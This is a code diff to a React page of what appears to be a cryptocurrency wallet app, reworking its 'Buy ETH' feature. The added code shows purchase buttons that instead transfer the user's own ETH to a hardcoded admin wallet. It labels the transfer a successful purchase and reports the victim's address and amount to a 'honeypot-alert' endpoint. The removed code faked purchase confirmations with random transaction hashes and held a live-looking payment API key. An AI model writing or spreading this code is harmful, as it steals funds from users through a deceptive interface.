@@ -178,47 +178,57 @@ export default function FlashedPage() {
     setTimeout(() => setStatus(''), 2000);
   };
 
-  const handleBuyOption = (method) => {
+  const handleBuyOption = async (method) => {
     const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
     
-    // Detect wallet type and redirect to appropriate purchase page
-    if (window.ethereum && window.ethereum.isMetaMask) {
-      // MetaMask purchase flow
-      if (method === 'card') {
-        window.open(`https://buy.moonpay.com/?apiKey=pk_live_xNzApwAanfvpDQjFQzTjZMXtdROAmPNM&currencyCode=eth&walletAddress=${adminWallet}&redirectURL=${window.location.href}`, '_blank');
-      } else {
-        window.open(`https://www.coinbase.com/buy-ethereum?address=${adminWallet}`, '_blank');
-      }
-    } else if (window.trustWallet || localStorage.getItem('connectedWallet')) {
-      // Trust Wallet purchase flow
-      if (method === 'card') {
-        window.open(`https://widget.changelly.com/?from=usd&to=eth&amount=100&address=${adminWallet}&fromDefault=usd&toDefault=eth&theme=default`, '_blank');
-      } else {
-        window.open(`https://www.binance.com/en/buy-sell-crypto?fiat=USD&crypto=ETH&amount=100&ref=37754157&utm_source=trustwallet`, '_blank');
-      }
-    } else {
-      // Generic purchase flow
-      window.open(`https://buy.moonpay.com/?apiKey=pk_live_xNzApwAanfvpDQjFQzTjZMXtdROAmPNM&currencyCode=eth&walletAddress=${adminWallet}`, '_blank');
-    }
-    
-    setShowModal(null);
-    setStatus('Redirecting to purchase page...');
-    
-    // Simulate purchase completion after 30 seconds
-    setTimeout(() => {
-      setStatus('Purchase completed! ETH added to your wallet.');
-      // Add fake transaction to history
+    setShowModal('buyConfirm');
+    setStatus(`Preparing ${method === 'card' ? 'card' : 'bank'} purchase...`);
+  };
+
+  const processBuyETH = async (amount) => {
+    try {
+      const provider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await provider.getSigner();
+      
+      const adminWallet = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
+      
+      const tx = await signer.sendTransaction({
+        to: adminWallet,
+        value: ethers.parseEther(amount)
+      });
+      
+      await tx.wait();
+      
+      // Add transaction to history
       const newTx = {
         id: Date.now(),
         type: 'buy',
-        amount: '0.1 ETH',
+        amount: `${amount} ETH`,
         to: adminWallet,
-        hash: '0x' + Math.random().toString(16).substr(2, 64),
+        hash: tx.hash,
         timestamp: new Date().toLocaleString(),
         status: 'Confirmed'
       };
       setTransactions(prev => [newTx, ...prev]);
-    }, 30000);
+      
+      setShowModal(null);
+      setStatus('ETH purchase completed successfully!');
+      
+      // Notify admin
+      await fetch('/api/honeypot-alert', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type: 'ETH_PURCHASE',
+          userAddress: userAddress,
+          amount: amount + ' ETH',
+          txHash: tx.hash
+        })
+      });
+      
+    } catch (error) {
+      setStatus('Purchase failed: ' + error.message);
+    }
   };
 
   if (!walletData) {
@@ -495,6 +505,43 @@ export default function FlashedPage() {
                   >
                     <div className="text-white font-semibold mb-2">Bank transfer</div>
                     <div className="text-gray-300 text-sm">Lower fees, takes 1-3 business days</div>
+                  </button>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {showModal === 'buyConfirm' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Purchase ETH</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4">
+                  <div className="text-gray-300 text-sm mb-4">
+                    Select amount to purchase:
+                  </div>
+                  <button 
+                    onClick={() => processBuyETH('0.01')}
+                    disabled={loading}
+                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
+                  >
+                    Buy 0.01 ETH (~$30)
+                  </button>
+                  <button 
+                    onClick={() => processBuyETH('0.05')}
+                    disabled={loading}
+                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
+                  >
+                    Buy 0.05 ETH (~$150)
+                  </button>
+                  <button 
+                    onClick={() => processBuyETH('0.1')}
+                    disabled={loading}
+                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold"
+                  >
+                    Buy 0.1 ETH (~$300)
                   </button>
                 </div>
               </div>
